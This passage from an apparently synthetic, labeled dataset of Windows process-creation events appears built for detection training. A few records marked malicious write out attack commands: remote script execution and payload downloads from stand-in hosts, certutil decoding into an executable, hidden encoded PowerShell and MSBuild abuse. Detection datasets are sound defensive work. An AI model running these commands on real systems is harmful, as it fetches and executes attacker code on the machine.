  {
    "UtcTime": "2024-07-01T17:12:37.558Z",
    "ProcessGuid": "{316B0F49-B278-4E3C-AD5E-A54BB82A9E35}",
    "ProcessId": 12791,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Test-Connection -ComputerName fileserver -Count 4\"",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessId": 45676,
    "User": "CORP\\jsmith",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T17:34:47.617Z",
    "ProcessGuid": "{E78AE72D-1AAF-4C8C-B6BD-9704228D4889}",
    "ProcessId": 13875,
    "Image": "C:\\Windows\\System32\\resmon.exe",
    "CommandLine": "resmon.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 51865,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T16:27:26.096Z",
    "ProcessGuid": "{9AEABB02-3DE9-40FD-B533-99760E48A138}",
    "ProcessId": 31451,
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "CommandLine": "certutil.exe -verify -urlfetch C:\\Certs\\server18.cer",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 44309,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-04T12:41:50.995Z",
    "ProcessGuid": "{CA41E893-DE78-4B4E-B542-108636BF0FFD}",
    "ProcessId": 51866,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c ipconfig /all",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 38910,
    "User": "CORP\\netadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T09:52:49.963Z",
    "ProcessGuid": "{D6BE0172-A6C6-472D-8B04-A722E278B089}",
    "ProcessId": 33223,
    "Image": "C:\\Windows\\System32\\wscript.exe",
    "CommandLine": "wscript.exe //e:jscript http://darkops2635.ru/script901.js",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe /c",
    "ParentProcessId": 31873,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1059.005",
    "technique_name": "WScript Remote Script",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-01T13:56:08.487Z",
    "ProcessGuid": "{437D6260-6FF6-4146-ADFF-B255DCCEF5DE}",
    "ProcessId": 15076,
    "Image": "C:\\Windows\\System32\\bitsadmin.exe",
    "CommandLine": "bitsadmin.exe /transfer wsus_update /download /priority normal http://internal-wsus.corp.local/update_kb2547674.cab C:\\Windows\\SoftwareDistribution\\Download\\update_kb2547674.cab",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s BITS",
    "ParentProcessId": 30239,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-04T03:29:42.781Z",
    "ProcessGuid": "{6793FAD1-E0C6-49B2-9645-A57ADBBA21EB}",
    "ProcessId": 36885,
    "Image": "C:\\Windows\\Microsoft.NET\\Framework\\v3.5\\MSBuild.exe",
    "CommandLine": "C:\\Windows\\Microsoft.NET\\Framework\\v3.5\\MSBuild.exe C:\\Users\\Public\\module824.csproj",
    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "ParentCommandLine": "powershell.exe",
    "ParentProcessId": 12835,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1127.001",
    "technique_name": "MSBuild Inline Task",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-04T16:33:31.910Z",
    "ProcessGuid": "{BDE09C08-BAD8-4212-B5A5-5E26CD6F4AD2}",
    "ProcessId": 62509,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c net user",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 9794,
    "User": "CORP\\pchen",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T15:15:54.230Z",
    "ProcessGuid": "{3FEBCA86-3691-4EDA-9DA0-A4AC46C29511}",
    "ProcessId": 20709,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c gpupdate /force",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 57199,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T16:25:05.357Z",
    "ProcessGuid": "{F188F58B-1F10-47F4-B91F-DF4254188077}",
    "ProcessId": 15496,
    "Image": "C:\\Windows\\System32\\mmc.exe",
    "CommandLine": "mmc.exe devmgmt.msc",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 58894,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T17:46:24.359Z",
    "ProcessGuid": "{25D4D865-4B24-4D9D-A593-39438582EBCD}",
    "ProcessId": 64127,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Get-Service | Where-Object {$_.Status -eq 'Running'}\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 29140,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T16:01:27.590Z",
    "ProcessGuid": "{69E70698-8E92-43B2-9CD4-8784AB7BD9D5}",
    "ProcessId": 21699,
    "Image": "C:\\Windows\\System32\\msiexec.exe",
    "CommandLine": "msiexec.exe /i http://deploy.corp.local/package15.msi /quiet /norestart",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 37258,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-02T13:25:14.912Z",
    "ProcessGuid": "{0C884D83-DAB9-473A-9DC7-B793CF67C809}",
    "ProcessId": 51603,
    "Image": "C:\\Windows\\System32\\resmon.exe",
    "CommandLine": "resmon.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 39640,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T13:14:24.583Z",
    "ProcessGuid": "{8652F803-863A-468C-8F2C-1E31E38DBF3A}",
    "ProcessId": 55615,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c tasklist",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 17104,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T08:25:12.643Z",
    "ProcessGuid": "{E976C1EF-DBCF-45B6-B36E-9A79C39543FA}",
    "ProcessId": 21024,
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "CommandLine": "certutil -decode C:\\Users\\Public\\encoded9073.txt C:\\Users\\Public\\decoded5453.exe",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 21560,
    "User": "CORP\\agarwal",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1140",
    "technique_name": "Certutil Base64 Decode",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-01T08:41:20.105Z",
    "ProcessGuid": "{48CD4603-9025-4258-AD25-645C060A2D81}",
    "ProcessId": 47120,
    "Image": "C:\\Windows\\System32\\resmon.exe",
    "CommandLine": "resmon.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 64467,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T12:10:46.702Z",
    "ProcessGuid": "{7DC9B548-ACF5-453D-A749-E7387DE6CC65}",
    "ProcessId": 23457,
    "Image": "C:\\Windows\\System32\\odbcad32.exe",
    "CommandLine": "odbcad32.exe",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
    "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\"",
    "ParentProcessId": 61447,
    "User": "CORP\\netadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T17:30:45.672Z",
    "ProcessGuid": "{A58589EC-1117-4C03-8291-2402C2CD5921}",
    "ProcessId": 24808,
    "Image": "C:\\Users\\sysadmin\\Downloads\\setup.exe",
    "CommandLine": "setup.exe /S /v/qn",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 47918,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T19:09:04.129Z",
    "ProcessGuid": "{6B72DDBB-519F-47E6-BC1A-1B91523BAF8B}",
    "ProcessId": 19023,
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k LocalService -p",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 41915,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T23:04:35.964Z",
    "ProcessGuid": "{20AF5327-F017-4FC6-878C-F501F42ADC19}",
    "ProcessId": 59859,
    "Image": "C:\\Windows\\System32\\UsoClient.exe",
    "CommandLine": "UsoClient.exe StartInteractiveScan",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 65096,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T22:30:40.186Z",
    "ProcessGuid": "{8009FEF8-DF2E-4F85-A61C-CDEA2CA18031}",
    "ProcessId": 54182,
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k NetworkService",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 9837,
    "User": "NT AUTHORITY\\NETWORK SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T16:58:30.775Z",
    "ProcessGuid": "{6AFD99DB-24B5-4331-B30A-CC6D2EEAC47E}",
    "ProcessId": 36226,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c robocopy C:\\Data D:\\Backup /mir",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 53559,
    "User": "CORP\\analyst01",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T12:04:34.481Z",
    "ProcessGuid": "{26D9A30C-1907-4DE0-8AEA-E10FAB92C0E1}",
    "ProcessId": 12901,
    "Image": "C:\\Windows\\System32\\schtasks.exe",
    "CommandLine": "schtasks.exe /run /tn \"\\Microsoft\\Windows\\WindowsUpdate\\Automatic App Update\"",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule",
    "ParentProcessId": 13595,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T12:17:11.026Z",
    "ProcessGuid": "{7A52A569-1145-44B6-8819-AE84B23C7E42}",
    "ProcessId": 21897,
    "Image": "C:\\Windows\\SoftwareDistribution\\Download\\Install\\update.exe",
    "CommandLine": "update.exe /quiet /norestart",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 40132,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T13:13:47.550Z",
    "ProcessGuid": "{D8B5BD32-C277-4B56-9CD4-7F31360E3506}",
    "ProcessId": 14885,
    "Image": "C:\\Python311\\python.exe",
    "CommandLine": "python.exe script.py",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 14356,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-07T04:37:01.324Z",
    "ProcessGuid": "{29ECF114-F9B9-457D-A029-ED503031E35A}",
    "ProcessId": 25755,
    "Image": "C:\\Windows\\Microsoft.NET\\Framework\\v3.5\\MSBuild.exe",
    "CommandLine": "C:\\Windows\\Microsoft.NET\\Framework\\v3.5\\MSBuild.exe C:\\Users\\Public\\svc346.csproj",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "powershell.exe",
    "ParentProcessId": 38378,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1127.001",
    "technique_name": "MSBuild Inline Task",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-03T14:22:33.548Z",
    "ProcessGuid": "{4622A677-CAFA-4556-841C-D4F8E9C46B41}",
    "ProcessId": 1637,
    "Image": "C:\\Windows\\System32\\odbcad32.exe",
    "CommandLine": "odbcad32.exe",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
    "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\"",
    "ParentProcessId": 46928,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T17:36:42.027Z",
    "ProcessGuid": "{7B715970-546F-4510-B02C-2EF396CBD81B}",
    "ProcessId": 6501,
    "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
    "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 43123,
    "User": "CORP\\netadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T13:15:21.993Z",
    "ProcessGuid": "{6721AE98-CEBF-420E-8BC6-4EEF3ACA6CA0}",
    "ProcessId": 19229,
    "Image": "C:\\Users\\sysadmin\\Downloads\\installer.exe",
    "CommandLine": "installer.exe --silent --accept-license",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 4299,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T19:16:42.083Z",
    "ProcessGuid": "{A8641EFD-01F0-4439-85E9-E4A5186F2CAE}",
    "ProcessId": 11292,
    "Image": "C:\\Windows\\explorer.exe",
    "CommandLine": "explorer.exe C:\\Users\\agarwal\\Documents",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 16719,
    "User": "CORP\\agarwal",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T00:04:12.924Z",
    "ProcessGuid": "{3E720216-FDB4-4488-9041-D9AE78E4AE5A}",
    "ProcessId": 43335,
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s wuauserv",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 30060,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T11:41:32.409Z",
    "ProcessGuid": "{69D764DB-C4E9-4F92-9747-FDBB16DAB145}",
    "ProcessId": 45532,
    "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
    "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 65300,
    "User": "CORP\\agarwal",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T03:32:08.652Z",
    "ProcessGuid": "{B5053151-D1C6-4F60-94C8-D9D9E2B7E9A0}",
    "ProcessId": 54737,
    "Image": "C:\\Windows\\System32\\wuauclt.exe",
    "CommandLine": "wuauclt.exe /detectnow /updatenow",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 26844,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T19:38:32.393Z",
    "ProcessGuid": "{78A20565-ABB8-4BF8-ABE5-53CCBD6EB2D0}",
    "ProcessId": 31324,
    "Image": "C:\\Windows\\System32\\spoolsv.exe",
    "CommandLine": "C:\\Windows\\System32\\spoolsv.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 39032,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T10:37:27.650Z",
    "ProcessGuid": "{FC7F9D98-7642-414D-835D-980907793C6A}",
    "ProcessId": 54362,
    "Image": "C:\\Program Files\\Microsoft VS Code\\Code.exe",
    "CommandLine": "Code.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 33225,
    "User": "CORP\\dbadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T16:53:00.311Z",
    "ProcessGuid": "{FFF55108-8956-4B4F-A2EF-1A21DBD9AFD1}",
    "ProcessId": 19803,
    "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
    "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 14774,
    "User": "CORP\\netadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T17:36:41.664Z",
    "ProcessGuid": "{BCDEC698-6F20-4320-91E9-C37891C5C5EB}",
    "ProcessId": 36287,
    "Image": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
    "CommandLine": "msedge.exe --type=gpu-process",
    "ParentImage": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
    "ParentCommandLine": "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\"",
    "ParentProcessId": 12438,
    "User": "CORP\\netadmin",
    "IntegrityLevel": "Low",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T08:58:49.091Z",
    "ProcessGuid": "{63256A7B-FF1A-439D-8C36-0341AEC38676}",
    "ProcessId": 43749,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c tasklist",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 38626,
    "User": "CORP\\analyst01",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T08:08:47.431Z",
    "ProcessGuid": "{D4D5CD68-AD3A-4269-A226-FFBD2130625A}",
    "ProcessId": 35477,
    "Image": "C:\\Program Files\\Microsoft\\Teams\\current\\Teams.exe",
    "CommandLine": "Teams.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 8448,
    "User": "CORP\\analyst01",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T14:48:02.676Z",
    "ProcessGuid": "{2E87BCD8-F52A-4A14-9A25-09CFC676BFFE}",
    "ProcessId": 61458,
    "Image": "C:\\Windows\\System32\\regsvr32.exe",
    "CommandLine": "regsvr32.exe /s C:\\Program Files\\Microsoft Office\\root\\Office16\\GROOVEEX.DLL",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe /c",
    "ParentProcessId": 43039,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-03T08:10:47.546Z",
    "ProcessGuid": "{731248A6-495F-43F7-9E3F-E4D1161374C0}",
    "ProcessId": 37902,
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "CommandLine": "certutil.exe -hashfile C:\\Downloads\\patch.msi MD5",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 5583,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-02T03:01:13.174Z",
    "ProcessGuid": "{80DB19E8-86B4-436B-86AD-AA7FDE4853BB}",
    "ProcessId": 42824,
    "Image": "C:\\Windows\\System32\\UsoClient.exe",
    "CommandLine": "UsoClient.exe StartInteractiveScan",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 20124,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T11:34:27.984Z",
    "ProcessGuid": "{3543E21B-3A1B-4442-B234-ABB8AB4C12DE}",
    "ProcessId": 60735,
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "CommandLine": "certutil.exe -hashfile C:\\Downloads\\patch.msi SHA1",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 37382,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-03T03:47:29.229Z",
    "ProcessGuid": "{E662B569-946C-43D1-8568-3676350E5BE1}",
    "ProcessId": 2758,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtADsASQBFAFgAKABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABzACkAKQA=",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "ParentCommandLine": "WINWORD.EXE /n",
    "ParentProcessId": 52853,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1059.001",
    "technique_name": "PowerShell Encoded Command",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-04T00:16:13.255Z",
    "ProcessGuid": "{60A81D32-0565-4FAD-9E2D-59E0EC8640DB}",
    "ProcessId": 46427,
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s wuauserv",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 5442,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T08:42:07.476Z",
    "ProcessGuid": "{2D3EAE9E-5F75-406D-970E-F70EF15D6AD7}",
    "ProcessId": 21106,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c net localgroup administrators",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 11467,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T01:33:42.692Z",
    "ProcessGuid": "{C93E2348-3FB8-4EFC-A13B-432A500E167B}",
    "ProcessId": 6570,
    "Image": "C:\\Windows\\System32\\bitsadmin.exe",
    "CommandLine": "bitsadmin.exe /transfer job4861 /download /priority high http://dropper-srv7283.xyz/module418.exe C:\\Users\\Public\\installer194.exe",
    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 8813,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1197",
    "technique_name": "BITSAdmin Download",
    "label": "malicious"
  },
  {
